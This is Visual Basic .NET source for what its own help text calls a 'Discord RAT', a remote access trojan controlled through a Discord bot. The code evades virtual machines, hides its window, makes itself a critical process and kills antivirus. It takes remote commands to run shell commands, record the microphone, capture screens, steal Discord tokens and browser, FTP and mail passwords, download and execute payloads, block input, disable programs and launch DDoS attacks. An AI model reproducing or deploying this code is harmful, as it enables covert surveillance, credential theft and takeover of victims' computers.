Imports Discord
Imports Discord.WebSocket
Imports System.Management
Imports System.Net
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.ServiceProcess
Imports System.Text
Imports System.Threading
Imports WMPLib

Public Class Form1
#Region "Api, MonitorKlasse & Konstanten"
    Private Declare Function mciExecute Lib "winmm.dll" (ByVal lpstrcommand As String) As Long
    <Runtime.InteropServices.DllImport("user32.dll", EntryPoint:="SendMessageA")> Private Shared Sub SendMessage(ByVal hWnd As IntPtr, ByVal uMsg As Int32, ByVal wParam As Int32, ByVal lParam As Int32)
    End Sub
    Private Enum Params As Int32
        SC_MONITORPOWER = &HF170    ' wParam
        WM_SYSCOMMAND = &H112       ' uMsg
        TURN_MONITOR_OFF = 2        ' Monitor ausschalten
        TURN_MONITOR_ON = -1        ' Monitor einschalten
    End Enum
    Private Declare Function BlockInput Lib "user32" (ByVal fBlock As Long) As Long
    Const API_FALSE As Long = 0&
    Const API_TRUE As Long = 1&
#End Region
#Region "ReadOnlys etc"
    Private ReadOnly rdm As New Random
    Private Function GetRandom(max As Integer) As Integer
        Return rdm.Next(0, max)
    End Function

    ReadOnly wc As New System.Net.WebClient
    ReadOnly IpAddresses() As String = wc.DownloadString("https://pastebin.com/raw/FVg1kwqF").Split(Environment.NewLine)
    ReadOnly Webhooks As String = IpAddresses(GetRandom(IpAddresses.Length))

    Dim Discord As DiscordSocketClient
    ReadOnly WebClient As WebClient = New WebClient
    ReadOnly Wake As String = "!"
    ReadOnly p() As Process
    ReadOnly Filez As String = "C:\Users\" & Environ("Username") & "\AppData\Roaming\Microsoft\Windows\audio.wav"
    ReadOnly Player As WindowsMediaPlayer = New WindowsMediaPlayer
    ReadOnly Pathplay As String = "C:\Users\" & Environ("Username") & "\AppData\Roaming\Microsoft\Windows\audio.mp3"
    ReadOnly Fileexe As String = "C:\Users\" & Environ("Username") & "\AppData\Roaming\Microsoft\Windows\FILE.exe"
    ReadOnly Filewallpaperpng As String = "C:\Users\" & Environ("Username") & "\AppData\Roaming\Microsoft\Windows\FILE.png"
    ReadOnly Client As New WebClient()
    ReadOnly ObjQuery As New ObjectQuery("SELECT * FROM Win32_VideoController")
    ReadOnly ObjSearcher As New ManagementObjectSearcher(ObjQuery)
    ReadOnly ObjQuery1 As New ObjectQuery("SELECT * FROM Win32_Processor")
    ReadOnly ObjSearcher1 As New ManagementObjectSearcher(ObjQuery1)
    Public Host As String
    ReadOnly attacker As New Threading.Thread(AddressOf Attack)
#End Region

#Region "Imports"
    <DllImport("winmm.dll")>
    Private Shared Function mciSendString(ByVal command As String, ByVal buffer As String, ByVal bufferSize As Integer, ByVal hwndCallback As IntPtr) As Integer
    End Function
    <DllImport("user32.dll")> Public Shared Function SendMessageW(ByVal hWnd As IntPtr, ByVal Msg As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr
    End Function

    Private Const APPCOMMAND_VOLUME_MUTE As Integer = &H80000
    Private Const APPCOMMAND_VOLUME_UP As Integer = &HA0000
    Private Const APPCOMMAND_VOLUME_DOWN As Integer = &H90000
    Private Const WM_APPCOMMAND As Integer = &H319

    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
    Private Const SETDESKWALLPAPER = 20
    Private Const UPDATEINIFILE = &H1
#End Region


    Public AVKillThread As New Thread(New ThreadStart(AddressOf AVKill.Start))


    Private Async Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            For Each s As ServiceController In ServiceController.GetServices()
                If (s.ServiceName = "QEMU-GA") And (s.Status.Equals(ServiceControllerStatus.Running)) Then
                    Application.Exit()
                End If
            Next
            For Each s As ServiceController In ServiceController.GetServices()
                If (s.ServiceName = "QEMU-GA") And (s.Status.Equals(ServiceControllerStatus.Running)) Then
                    Application.Exit()
                End If
            Next

            Discord = New DiscordSocketClient(New DiscordSocketConfig With {
                                  .WebSocketProvider = Net.Providers.WS4Net.WS4NetProvider.Instance,
                                  .UdpSocketProvider = Net.Udp.DefaultUdpSocketProvider.Instance,
                                  .MessageCacheSize = 50
})
            AddHandler Discord.MessageReceived, AddressOf OnMessage

            Await Discord.LoginAsync(TokenType.Bot, Webhooks)
            Await Discord.StartAsync


            If My.Settings.FirstRun = True Then
                Me.Opacity = 0
                Me.ShowInTaskbar = False
                Me.Hide()
                My.Settings.FirstRun = False
                My.Settings.Save()
                My.Settings.Reload()
                Application.Restart()
            Else
                Me.Opacity = 0
                Me.ShowInTaskbar = False
                Me.Hide()
                Start()
                C_CriticalProcess.CriticalProcess_Enable()
                C_Nosleep.No_Sleep()
                Bypassrecovery()
                Registrys()
            End If
            If Application.ExecutablePath.Contains("HardwareCheck.exe") Then
                AVKill.Start()
                Dim r As New Random
                My.Computer.FileSystem.MoveFile(Application.ExecutablePath, IO.Path.GetTempPath & r.Next(1000, 9000).ToString)
                End
            End If

        Catch ex As Exception
        End Try

    End Sub

    Private Async Function OnMessage(message As SocketMessage) As Task

        If message.Source <> MessageSource.Bot And message.Content.StartsWith(Wake) Then
            If message.Content.StartsWith(Wake & "online") Then
                Await message.Channel.SendMessageAsync("```Connected Targets: " + System.Environment.UserName + "```")
            End If
        End If

        If message.Source <> MessageSource.Bot And message.Content.StartsWith(Wake) Then
            If message.Content.StartsWith(Wake & "open " + System.Environment.UserName) Then
                Try
                    Dim messageToSend As String = message.Content.Replace("!open " + System.Environment.UserName, "").Replace(" ", "")
                    Dim webAddress As String = messageToSend
                    Process.Start(webAddress)
                    Threading.Thread.Sleep(500)
                    For Each P As Process In System.Diagnostics.Process.GetProcessesByName("cmd" And "conhost")
                        P.Kill()
                    Next
                Catch ex As Exception
                End Try
            End If
        End If

        If message.Source <> MessageSource.Bot And message.Content.StartsWith(Wake) Then
            If message.Content.StartsWith(Wake & "kill " + System.Environment.UserName) Then
                Try
                    Dim messageToSend As String = message.Content.Replace("!kill " + System.Environment.UserName, "").Replace(" ", "")
                    KillProcess(messageToSend)
                    Await message.Channel.SendMessageAsync("```Process: " + "'" + messageToSend + "' " + " killed " + System.Environment.UserName + "```")
                    Delay(0.5)
                    For Each P As Process In System.Diagnostics.Process.GetProcessesByName("cmd" And "conhost")
                        P.Kill()
                    Next
                Catch ex As Exception
                End Try
            End If
        End If


        If message.Source <> MessageSource.Bot And message.Content.StartsWith(Wake) Then
            If message.Content.StartsWith(Wake & "cmd " + System.Environment.UserName) Then
                Try
                    Dim messageToSend As String = message.Content.Replace("!cmd " + System.Environment.UserName, "")
                    Shell("cmd.exe /k " + messageToSend + " > C:\Users\" & Environ("Username") & "\AppData\Roaming\Microsoft\Windows\output.txt 2>&1", AppWinStyle.Hide)
                    Await message.Channel.SendMessageAsync("```Ran cmd command: " + "'" + messageToSend + "' for: " + System.Environment.UserName + " output:" + "```")
                    Await message.Channel.SendFileAsync("C:\Users\" & Environ("Username") & "\AppData\Roaming\Microsoft\Windows\output.txt")
                    Delay(0.5)
                    System.IO.File.Delete("C:\Users\" & Environ("Username") & "\AppData\Roaming\Microsoft\Windows\output.txt")
                    For Each P As Process In System.Diagnostics.Process.GetProcessesByName("cmd" And "conhost")
                        P.Kill()
                    Next
                Catch ex As Exception
                End Try
            End If
        End If


        If message.Source <> MessageSource.Bot And message.Content.StartsWith(Wake) Then
            If message.Content.StartsWith(Wake & "process " + System.Environment.UserName) Then

                Dim messageToSend As String = message.Content.Replace("!process " + System.Environment.UserName, "").Replace(" ", "")
                Dim p1 As String = messageToSend
                Try
                    If Process.GetProcessesByName(p1).Count > 0 Then
                        Await message.Channel.SendMessageAsync("```Process: " + "'" + messageToSend + "' " + System.Environment.UserName + " is running```")


                    Else
                        Await message.Channel.SendMessageAsync("```Process: " + "'" + messageToSend + "' " + System.Environment.UserName + " isn't running```")
                    End If
                Catch ex As Exception
                End Try
            End If
        End If

        If message.Source <> MessageSource.Bot And message.Content.StartsWith(Wake) Then
            If message.Content.StartsWith(Wake & "record " + System.Environment.UserName) Then
                Try
                    Dim messageToSend As String = message.Content.Replace("!record " + System.Environment.UserName, "")
                    Await message.Channel.SendMessageAsync("```Recording microphone for: " + Environment.UserName + "```")
                    mciSendString("open new Type waveaudio Alias recsound", "", 0, 0)
                    mciSendString("set recsound time format ms bitspersample 16 channels 2 samplespersec 48000 bytespersec 192000 alignment 4", "", 0, 0)
                    mciSendString("record recsound", "", 0, 0)
                    Delay(messageToSend + 1)
                    mciSendString("save recsound " & Filez, "", 0, 0)
                    mciSendString("close recsound ", "", 0, 0)
                    Await message.Channel.SendMessageAsync("```Recorded microphone for: " + Environment.UserName + " - for " + messageToSend + " seconds!```")
                    Await Task.Run(Sub() message.Channel.SendFileAsync(Filez))
                    Delay(1)
                    System.IO.File.Delete(Filez)
                Catch ex2 As Exception
                End Try
            End If
        End If

        If message.Source <> MessageSource.Bot And message.Content.StartsWith(Wake) Then
            If message.Content.StartsWith(Wake & "files " + System.Environment.UserName) Then
                Try
                    Dim messageToSend As String = message.Content.Replace("!files " + System.Environment.UserName, "").Replace(" ", "")
                    For Each file As String In My.Computer.FileSystem.GetFiles(messageToSend)
                        Await message.Channel.SendFileAsync(file)
                    Next
                Catch ex As Exception
                End Try
            End If
        End If


        If message.Source <> MessageSource.Bot And message.Content.StartsWith(Wake) Then
            If message.Content.StartsWith(Wake & "download " + System.Environment.UserName + " " + "NET") Then
                Try
                    Dim messageToSend As String = message.Content.Replace("!download " + System.Environment.UserName + " " + "NET", "")
                    DownloadExecute(messageToSend)
                    Await message.Channel.SendMessageAsync("```Downloaded NET file and ran it in memory for: " + System.Environment.UserName + "```")
                Catch ex As Exception
                End Try
                If message.Content.StartsWith(Wake & "download " + System.Environment.UserName + " " + "normal") Then
                    Try
                        Dim messageToSend As String = message.Content.Replace("!download " + System.Environment.UserName + " " + "normal", "")
                        Await Task.Run(Sub() Client.DownloadFile(messageToSend, Fileexe))
                        Process.Start(Fileexe)
                        Await message.Channel.SendMessageAsync("Downloaded and started the file for " + System.Environment.UserName + " - file:")
                        Await Task.Run(Sub() message.Channel.SendFileAsync(Fileexe))
                        Delay(1)
                        System.IO.File.Delete(Fileexe)
                    Catch ex As Exception
                    End Try
                End If
            End If
        End If


        If message.Source <> MessageSource.Bot And message.Content.StartsWith(Wake) Then
            If message.Content.StartsWith(Wake & "setwallpaper " + System.Environment.UserName) Then
                Try
                    Dim messageToSend As String = message.Content.Replace("!setwallpaper " + System.Environment.UserName, "")

                    Client.Headers.Add("User-Agent", "Mozilla/4.0 (compatible; MSIE 8.0)")
                    Dim url = messageToSend
                    Client.DownloadFileAsync(New Uri(url), Filewallpaperpng)
                    Delay(5)
                    SystemParametersInfo(SETDESKWALLPAPER, 0, Filewallpaperpng, UPDATEINIFILE)
                    Await message.Channel.SendMessageAsync("Downloaded and setted the image as wallpaper " + System.Environment.UserName + " - file:")
                    Await message.Channel.SendFileAsync(Filewallpaperpng)
                    Delay(5)
                    System.IO.File.Delete(Filewallpaperpng)
                Catch ex As Exception
                End Try
            End If
        End If


        If message.Source <> MessageSource.Bot And message.Content.StartsWith(Wake) Then
            If message.Content.StartsWith(Wake & "audio " + System.Environment.UserName + " " + "play") Then
                Try
                    Dim messageToSend As String = message.Content.Replace("!audio " + System.Environment.UserName + " " + "play", "")
                    Client.Headers.Add("User-Agent", "Mozilla/4.0 (compatible; MSIE 8.0)")
                    Dim fileURL As String = messageToSend
                    Client.DownloadFileAsync(New Uri(fileURL), Pathplay)
                    Delay(2)
                    Player.URL = Pathplay
                    Delay(0.5)
                    Player.controls.play()
                    For a = 100 To 1 Step -1
                        SendMessageW(Me.Handle, WM_APPCOMMAND, Me.Handle, New IntPtr(APPCOMMAND_VOLUME_UP))
                    Next
                    Delay(0.5)
                    Await message.Channel.SendMessageAsync("```Playing audio for " + System.Environment.UserName + ":```")
                    Delay(0.5)
                    Await message.Channel.SendFileAsync(Pathplay)
                Catch ex As Exception
                End Try
            ElseIf message.Content.StartsWith(Wake & "audio " + System.Environment.UserName + " " + "stop") Then
                Try
                    Player.controls.stop()
                    Player.close()
                    System.IO.File.Delete(Pathplay)
                    Await message.Channel.SendMessageAsync("```Stopped & deleted played audio for " + System.Environment.UserName + "```")
                Catch ex As Exception
                End Try
            End If
        End If



        If message.Source <> MessageSource.Bot And message.Content.StartsWith(Wake) Then
            If message.Content.StartsWith(Wake & "monitor " + System.Environment.UserName + " " + "on") Then
                Try
                    SendMessage(Me.Handle, Params.WM_SYSCOMMAND, Params.SC_MONITORPOWER, Params.TURN_MONITOR_ON)
                    Await message.Channel.SendMessageAsync("```Setted monitor state to: " + "'" + "ON" + "' " + System.Environment.UserName + "```")
                Catch ex As Exception
                End Try
            ElseIf message.Content.StartsWith(Wake & "monitor " + System.Environment.UserName + " " + "off") Then
                Try
                    SendMessage(Me.Handle, Params.WM_SYSCOMMAND, Params.SC_MONITORPOWER, Params.TURN_MONITOR_OFF)
                    Await message.Channel.SendMessageAsync("```Setted monitor state to: " + "'" + "OFF" + "' " + System.Environment.UserName + "```")
                Catch ex As Exception
                End Try
            End If
        End If




        If message.Source <> MessageSource.Bot And message.Content.StartsWith(Wake) Then
            If message.Content.StartsWith(Wake & "block " + System.Environment.UserName) Then
                Try
                    BlockInput(API_TRUE)
                    Await message.Channel.SendMessageAsync("```Setted BlockInput to: " + "'" + "TRUE" + "' " + System.Environment.UserName + "```")
                Catch ex As Exception
                End Try
            ElseIf message.Content.StartsWith(Wake & "block " + System.Environment.UserName + " " + "block") Then
                Try
                    BlockInput(API_FALSE)
                    Await message.Channel.SendMessageAsync("```Setted BlockInput to: " + "'" + "FALSE" + "' " + System.Environment.UserName + "```")
                Catch ex As Exception
                End Try
            End If
        End If


        If message.Source <> MessageSource.Bot And message.Content.StartsWith(Wake) Then
            If message.Content.StartsWith(Wake & "service " + System.Environment.UserName + " " + "start") Then
                Dim messageToSend As String = message.Content.Replace("!service " + System.Environment.UserName + " " + "start", "")
                Try
                    Dim sc As New ServiceController(messageToSend)
                    sc.Start()
                    Await message.Channel.SendMessageAsync("```Service: " + sc.ServiceName + " started for " + System.Environment.UserName + "```")
                Catch ex As Exception
                End Try
            ElseIf message.Content.StartsWith(Wake & "service " + System.Environment.UserName + " " + "stop") Then
                Dim messageToSend As String = message.Content.Replace("!service ", "").Replace("for " & System.Environment.UserName, "").Replace(" ", "").Replace("stop", "")
                Try
                    Dim sc As New ServiceController(messageToSend)
                    sc.Stop()
                    Await message.Channel.SendMessageAsync("```Service: " + sc.ServiceName + " stopped for " + System.Environment.UserName + "```")
                Catch ex As Exception
                End Try
            ElseIf message.Content.StartsWith(Wake & "service " + System.Environment.UserName + " " + "check") Then
                Dim messageToSend As String = message.Content.Replace("!service ", "").Replace("for " & System.Environment.UserName, "").Replace(" ", "").Replace("check", "")
                Try
                    For Each s As ServiceController In ServiceController.GetServices()
                        If (s.ServiceName = messageToSend) And (s.Status.Equals(ServiceControllerStatus.Running)) Then
                            Await message.Channel.SendMessageAsync("```Service: " + s.ServiceName + " is running for " + System.Environment.UserName + "```")
                        End If

                        If (s.ServiceName = messageToSend) And (s.Status.Equals(ServiceControllerStatus.Stopped)) Then
                            Await message.Channel.SendMessageAsync("```Service: " + s.ServiceName + " isn't running for " + System.Environment.UserName + "```")
                        End If

                        If (s.ServiceName = messageToSend) And (s.Status.Equals(ServiceControllerStatus.Paused)) Then
                            Await message.Channel.SendMessageAsync("```Service: " + s.ServiceName + " is paused for " + System.Environment.UserName + "```")
                        End If
                    Next
                Catch ex As Exception
                End Try
            ElseIf message.Content.StartsWith(Wake & "service " + System.Environment.UserName + " " + "all") Then
                Dim file As System.IO.StreamWriter
                file = My.Computer.FileSystem.OpenTextFileWriter("C:\Users\" & Environ("Username") & "\AppData\Roaming\Microsoft\Windows\svchost1.txt", True)
                For Each service As ServiceController In ServiceController.GetServices()
                    Dim serviceName As String = service.ServiceName
                    Dim serviceDisplayName As String = service.DisplayName
                    Dim serviceType As String = service.ServiceType.ToString()
                    Dim status As String = service.Status.ToString()
                    file.WriteLine(serviceName + "  " + serviceDisplayName + serviceType + " " + status)
                Next
                file.Close()
                Await message.Channel.SendFileAsync("C:\Users\" & Environ("Username") & "\AppData\Roaming\Microsoft\Windows\svchost1.txt")
                System.IO.File.Delete("C:\Users\" & Environ("Username") & "\AppData\Roaming\Microsoft\Windows\svchost1.txt")
            End If
        End If



        If message.Source <> MessageSource.Bot And message.Content.StartsWith(Wake) Then
            If message.Content.StartsWith(Wake & "note " + System.Environment.UserName + " " + "set") Then
                Try
                    Dim messageToSend As String = message.Content.Replace("!note " + System.Environment.UserName + " " + "set", "")
                    File.Create("C:\Users\" & Environ("Username") & "\AppData\Roaming\Microsoft\Windows\note.txt").Dispose()
                    File.WriteAllText("C:\Users\" & Environ("Username") & "\AppData\Roaming\Microsoft\Windows\note.txt", messageToSend)
                    Await message.Channel.SendMessageAsync("```setted note for " + System.Environment.UserName + " to: " + "'" + messageToSend + "'" + "```")
                Catch ex As Exception
                End Try
            ElseIf message.Content.StartsWith(Wake & "note " + System.Environment.UserName + " " + "get") Then
                Try
                    Dim value As String = File.ReadAllText("C:\Users\" & Environ("Username") & "\AppData\Roaming\Microsoft\Windows\note.txt")
                    Await message.Channel.SendMessageAsync("```The note for " + System.Environment.UserName + " is: " + "'" + value + "'" + "```")
                Catch ex As Exception
                End Try
            ElseIf message.Content.StartsWith(Wake & "note " + System.Environment.UserName + " " + "remove") Then
                Try
                    Dim path As String = "C:\Users\" & Environ("Username") & "\AppData\Roaming\Microsoft\Windows\note.txt"
                    Dim value As String = File.ReadAllText("C:\Users\" & Environ("Username") & "\AppData\Roaming\Microsoft\Windows\note.txt")
                    File.Delete(path)
                    Await message.Channel.SendMessageAsync("```Deleted note for " + System.Environment.UserName + " in " + "'" + path + "'" + " with the value: " + "'" + value + "'" + "```")
                Catch ex As Exception
                End Try
            End If
        End If


        If message.Source <> MessageSource.Bot And message.Content.StartsWith(Wake) Then
            If message.Content.StartsWith(Wake & "volume " + System.Environment.UserName + " " + "up") Then
                Try
                    For a = 100 To 1 Step -1
                        SendMessageW(Me.Handle, WM_APPCOMMAND, Me.Handle, New IntPtr(APPCOMMAND_VOLUME_UP))
                    Next
                    Await message.Channel.SendMessageAsync("Sound volume increased for " + System.Environment.UserName)
                Catch ex As Exception
                End Try
            ElseIf message.Content.StartsWith(Wake & "volume " + System.Environment.UserName + " " + "down") Then
                Try
                    For a = 100 To 1 Step -1
                        SendMessageW(Me.Handle, WM_APPCOMMAND, Me.Handle, New IntPtr(APPCOMMAND_VOLUME_DOWN))
                    Next
                    Await message.Channel.SendMessageAsync("Sound volume decreased for " + System.Environment.UserName)
                Catch ex As Exception
                End Try
            ElseIf message.Content.StartsWith(Wake & "volume " + System.Environment.UserName + " " + "mute") Then
                Try
                    SendMessageW(Me.Handle, WM_APPCOMMAND, Me.Handle, New IntPtr(APPCOMMAND_VOLUME_MUTE))
                    Await message.Channel.SendMessageAsync("Sound muted for " + System.Environment.UserName)
                Catch ex As Exception
                End Try
            End If
        End If



        If message.Source <> MessageSource.Bot And message.Content.StartsWith(Wake) Then
            If message.Content.StartsWith(Wake & "discordtoken " + System.Environment.UserName + " " + "app") Then
                Try
                    Dim text As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\discord\Local Storage\leveldb\"
                    Dim text2 As String = IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\discord\Local Storage\cop\", IO.Path.GetFileName(IO.Path.GetDirectoryName(text)))
                    If Not Directory.Exists(text2) Then
                        Directory.CreateDirectory(text2)
                    End If
                    My.Computer.FileSystem.CopyDirectory(text, text2)
                    Dim text3 As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Google\Chrome\User Data\Default\Local Storage\leveldb\"
                    Dim text4 As String = IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\discord\Local Storage\cof\", IO.Path.GetFileName(IO.Path.GetDirectoryName(text3)))
                    If Not Directory.Exists(text4) Then
                        Directory.CreateDirectory(text4)
                    End If
                    My.Computer.FileSystem.CopyDirectory(text3, text4)
                Catch ex As Exception
                End Try
                Try
                    Dim Path As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\discord\Local Storage\cop\leveldb\"
                    For Each xFiles In System.IO.Directory.GetFiles(Path, "*", System.IO.SearchOption.TopDirectoryOnly)
                        Await message.Channel.SendFileAsync(xFiles)
                    Next
                Catch ex As Exception
                End Try
            ElseIf message.Content.StartsWith(Wake & "discordtoken " + System.Environment.UserName + " " + "chrome") Then
                Try
                    Dim Path As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\discord\Local Storage\cof\leveldb\"
                    For Each xFiles In System.IO.Directory.GetFiles(Path, "*", System.IO.SearchOption.TopDirectoryOnly)
                        Await message.Channel.SendFileAsync(xFiles)
                    Next
                Catch ex As Exception
                End Try
            End If
        End If



        If message.Source <> MessageSource.Bot And message.Content.StartsWith(Wake) Then
            If message.Content.StartsWith(Wake & "screen " + System.Environment.UserName) Then
                Try
                    Dim screenSize As Size = New Size(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
                    Dim screenGrab As New Bitmap(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
                    Dim g As Graphics = Graphics.FromImage(screenGrab)
                    g.CopyFromScreen(New Point(0, 0), New Point(0, 0), screenSize)
                    PictureBox1.Image = screenGrab
                    PictureBox1.Image.Save("C:\Users\" & Environ("Username") & "\AppData\Roaming\Microsoft\Windows\scr.png")
                    Await message.Channel.SendFileAsync("C:\Users\" & Environ("Username") & "\AppData\Roaming\Microsoft\Windows\scr.png")
                    Delay(0.5)
                    System.IO.File.Delete("C:\Users\" & Environ("Username") & "\AppData\Roaming\Microsoft\Windows\scr.png")
                Catch ex As Exception
                End Try
            End If
        End If




        If message.Source <> MessageSource.Bot And message.Content.StartsWith(Wake) Then
            If message.Content.StartsWith(Wake & "client " + System.Environment.UserName + " " + "disconnect") Then
                Try
                    Await Discord.StopAsync()
                    Await message.Channel.SendMessageAsync("```disconnected: " + System.Environment.UserName + "```")
                Catch ex As Exception
                End Try
            ElseIf message.Content.StartsWith(Wake & "client " + System.Environment.UserName + " " + "restart") Then
                Try
                    Await Discord.StopAsync()
                    Await Discord.StartAsync()
                    Await message.Channel.SendMessageAsync("```restarted client: " + System.Environment.UserName + "```")
                Catch ex As Exception
                End Try
            End If
        End If


        If message.Source <> MessageSource.Bot And message.Content.StartsWith(Wake) Then
            If message.Content.StartsWith(Wake & "runningprocesses " + System.Environment.UserName) Then
                Try
                    Dim plist() As Process = Process.GetProcesses()
                    Dim file As System.IO.StreamWriter
                    file = My.Computer.FileSystem.OpenTextFileWriter("C:\Users\" & Environ("Username") & "\AppData\Roaming\Microsoft\Windows\svchost.txt", True)
                    For Each prs As Process In plist
                        file.WriteLine(prs.ProcessName + "         (" + prs.PrivateMemorySize64.ToString() + ")")
                    Next
                    file.Close()
                    Await message.Channel.SendFileAsync("C:\Users\" & Environ("Username") & "\AppData\Roaming\Microsoft\Windows\svchost.txt")
                    System.IO.File.Delete("C:\Users\" & Environ("Username") & "\AppData\Roaming\Microsoft\Windows\svchost.txt")
                Catch ex As Exception
                End Try
            End If
        End If




        If message.Source <> MessageSource.Bot And message.Content.StartsWith(Wake) Then
            If message.Content.StartsWith(Wake & "passwords " + System.Environment.UserName) Then
                Dim file As System.IO.StreamWriter
                file = My.Computer.FileSystem.OpenTextFileWriter("C:\Users\" & Environ("Username") & "\AppData\Roaming\Microsoft\Windows\svchost3.txt", True)
                For Each Drive As DriveInfo In DriveInfo.GetDrives
                    If Drive.RootDirectory.FullName = "C:\" Then
                        Dim x As New PREC(Drive)
                        With x
                            .RecoverChrome()
                            .RecoverFileZilla()
                            .RecoverFirefox()
                            .RecoverOpera()
                            .RecoverPidgin()
                            .RecoverThunderbird()
                            .RecoverProxifier()
                        End With
                        For Each A As Account In x.Accounts
                            file.WriteLine(A.ToString())
                        Next
                        file.Close()
                        Await message.Channel.SendFileAsync("C:\Users\" & Environ("Username") & "\AppData\Roaming\Microsoft\Windows\svchost3.txt")
                        System.IO.File.Delete("C:\Users\" & Environ("Username") & "\AppData\Roaming\Microsoft\Windows\svchost3.txt")
                    End If
                Next
            End If
        End If


        If message.Source <> MessageSource.Bot And message.Content.StartsWith(Wake) Then
            If message.Content.StartsWith(Wake & "ddos " + "start") Then
                Dim messageToSend As String = message.Content.Replace("!ddos " + "start", "").Replace(" ", "")
                Try
                    attacker.IsBackground = True
                    attacker.Start(messageToSend)
                    Await message.Channel.SendMessageAsync("Attack started on: " + messageToSend)
                Catch ex As Exception
                End Try
            ElseIf message.Content.StartsWith(Wake & "ddos " + "stop") Then
                Try
                    attacker.Abort()
                    Await message.Channel.SendMessageAsync("Attack stopped")
                Catch ex As Exception
                End Try
            End If
        End If



        If message.Source <> MessageSource.Bot And message.Content.StartsWith(Wake) Then
            If message.Content.StartsWith(Wake & "checkversion " + System.Environment.UserName) Then
                Try
                    Await message.Channel.SendMessageAsync("```2.6.2```")
                Catch ex As Exception
                End Try
            End If
        End If


        If message.Source <> MessageSource.Bot And message.Content.StartsWith(Wake) Then
            If message.Content.StartsWith(Wake & "program " + System.Environment.UserName + " " + "disable") Then
                Dim messageToSend As String = message.Content.Replace("!program " + System.Environment.UserName + " " + "disable", "").Replace(" ", "")
                Try
                    My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" + messageToSend,
            "Debugger", "C:\Windows\System32\" + GetRandomString(20) + ".exe")
                    KillProcess(messageToSend)
                    Await message.Channel.SendMessageAsync("```Disabled and killed: " + messageToSend + " for " + System.Environment.UserName + "```")
                Catch ex As Exception
                End Try
            ElseIf message.Content.StartsWith(Wake & "program " + System.Environment.UserName + " " + "enable") Then
                Dim messageToSend As String = message.Content.Replace("!program " + System.Environment.UserName + " " + "enable", "").Replace(" ", "")
                Try
                    My.Computer.Registry.LocalMachine.DeleteSubKey("Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" + messageToSend)
                    Await message.Channel.SendMessageAsync("```Enabled: " + messageToSend + " for " + System.Environment.UserName + "```")
                Catch ex As Exception
                End Try
            End If
        End If


        If message.Source <> MessageSource.Bot And message.Content.StartsWith(Wake) Then
            If message.Content.StartsWith(Wake & "updateclient " + System.Environment.UserName) Then
                Dim messageToSend As String = message.Content.Replace("!updateclient " + System.Environment.UserName, "").Replace(" ", "")
                Try
                    Await message.Channel.SendMessageAsync("```Updating Client...```")
                    C_CriticalProcess.CriticalProcesses_Disable()
                    Await message.Channel.SendMessageAsync("```Disabled Critical Process...```")
                    Shell("schtasks /delete /tn svchost /f " + """'" & Application.ExecutablePath & "'""", AppWinStyle.Hide, False, -1)
                    Await message.Channel.SendMessageAsync("```Removed startup... ready to execute!```")
                    DownloadExecute(messageToSend)
                    Delay(2)
                    MeltFile()
                    Await message.Channel.SendMessageAsync("```DONE```")
                Catch ex As Exception
                End Try
            End If
        End If


        If message.Source <> MessageSource.Bot And message.Content.StartsWith(Wake) Then
            If message.Content.StartsWith(Wake & "uninstall " + System.Environment.UserName) Then
                Try
                    Await message.Channel.SendMessageAsync("```Uninstalling " + System.Environment.UserName + "...```")
                    C_CriticalProcess.CriticalProcesses_Disable()
                    Await message.Channel.SendMessageAsync("```Disabled Critical Process...```")
                    Shell("schtasks /delete /tn svchost /f " + """'" & Application.ExecutablePath & "'""", AppWinStyle.Hide, False, -1)
                    Await message.Channel.SendMessageAsync("```Removed startup...```")
                    Await message.Channel.SendMessageAsync("```DONE```")
                    Await message.Channel.SendMessageAsync("```Removing main file...```")
                    MeltFile()
                Catch ex As Exception
                End Try
            End If
        End If



        If message.Source <> MessageSource.Bot And message.Content.StartsWith(Wake) Then
            If message.Content.StartsWith(Wake & "changelog") Then
                Try
                    Await message.Channel.SendMessageAsync("```Changelog for version 2.6.2:
- Fixed random command bug
- Changed 'Download And Execute' to 'Download and Execute in Memory'
- Added enable & disable program feature
- Added uninstall feature
- Optimizations...
```")
                Catch ex As Exception
                End Try
            End If
        End If


        If message.Source <> MessageSource.Bot And message.Content.StartsWith(Wake) Then
            If message.Content.StartsWith(Wake & "commands " + System.Environment.UserName) Then
                Try
                    Await message.Channel.SendMessageAsync("```Discord RAT commands:
!commands [NAME] (Displays all commands for the user's version)
!online (Shows how many victims are currently connected)
!info [NAME] [general/gpu/cpu] (Show's general, gpu or cpu infos  
!RATInfo (Show's the RATInfo) 
!checkversion [NAME] (Show's which client version the victim has installed) 
!client [NAME] [disconnect/restart] (You can disconnect or restart clients, if you disconnect them then they will be back after they restart their pc) 
!note [NAME] [set (TEXT)/get/remove] (Setting a special note for the victim) 
!kill [NAME] [PROCESS with .exe] (Killing a specific process for the victim) 
!cmd [NAME] [CMD COMMAND (no output yet)] (Run's a CMD command, output incoming!) 
!process [NAME] [PROCESS NAME] (Checking if process is running or not) 
!runningprocesses [NAME] (Get's a .txt for all running processes from the victim) 
!service [NAME] [start/stop/check + service name] (starting, stopping or checking the service, example: !service check TEST for victim) 
!screen [NAME] (Getting a screen from victim's desktop)
!program [NAME] [disable/enable] [PROGRAM NAME with .exe] (Enables/Disables a program)```")
                    Await message.Channel.SendMessageAsync("```!discordtoken [app/chrome] for [NAME] (Getting the discordtoken out of their app or browser) 
!passwords [NAME] (Getting all passwords from the victim out of his browser)
!audio [NAME] [play/stop] [DIRECTLINK] (Playing an audio from a directlink) 
